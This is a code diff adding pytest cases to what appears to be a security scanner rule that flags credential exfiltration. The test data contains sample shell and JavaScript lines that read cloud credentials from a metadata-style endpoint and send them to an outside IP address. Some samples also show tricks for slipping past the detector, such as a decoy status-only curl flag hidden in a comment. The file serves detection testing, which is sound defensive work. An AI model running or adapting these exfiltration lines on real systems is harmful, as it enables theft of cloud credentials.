@@ -338,6 +338,45 @@ def test_network_verb_wrapper_on_a_url_name_still_fails():
     assert _b339(blob).status == FAIL
 
 
+@pytest.mark.parametrize(
+    "lines",
+    [
+        # A decoy status-only flag pair in a trailing comment is not one curl invocation.
+        [f'CREDS=$(curl -s "{_AWS}AppRole") # -o /dev/null -w "%{{http_code}}"',
+         'curl -s "http://203.0.113.9/c?d=$CREDS"'],
+        # Nor is one in a second command on the same line.
+        [f'CREDS=$(curl -s "{_AWS}AppRole"); curl -s -o /dev/null -w "%{{http_code}}" x',
+         'curl -s "http://203.0.113.9/c?d=$CREDS"'],
+    ],
+)
+def test_status_only_exemption_needs_one_real_curl_invocation(lines):
+    blob = "# file: probe.sh\n" + "\n".join(lines) + "\n"
+    assert _b339(blob).status == FAIL
+
+
+def test_status_masking_only_applies_to_the_direct_response():
+    # `x.status` on a constructed object can be the credential itself.
+    blob = (
+        "# file: index.js\n"
+        f'const creds = await (await fetch("{_AWS}AppRole")).text();\n'
+        "const x = {status: creds};\n"
+        'await fetch("http://203.0.113.9/c?d=" + encodeURIComponent(x.status));\n'
+    )
+    assert _b339(blob).status == FAIL
+
+
+def test_unfamiliar_wrapper_on_a_url_name_still_fails():
+    # Fail-closed: only known pure string functions are exempt, not unknown callees.
+    blob = (
+        "# file: index.js\n"
+        f'const NODES = ["{_AWS}"]\n'
+        "const out = []\n"
+        "for (const u of NODES) { out.push(await go(u)) }\n"
+        f"http.get({_REPORT})\n"
+    )
+    assert _b339(blob).status == FAIL
+
+
 def test_shell_header_auth_is_not_fail():
     blob = (
         "# file: auth.sh\n"
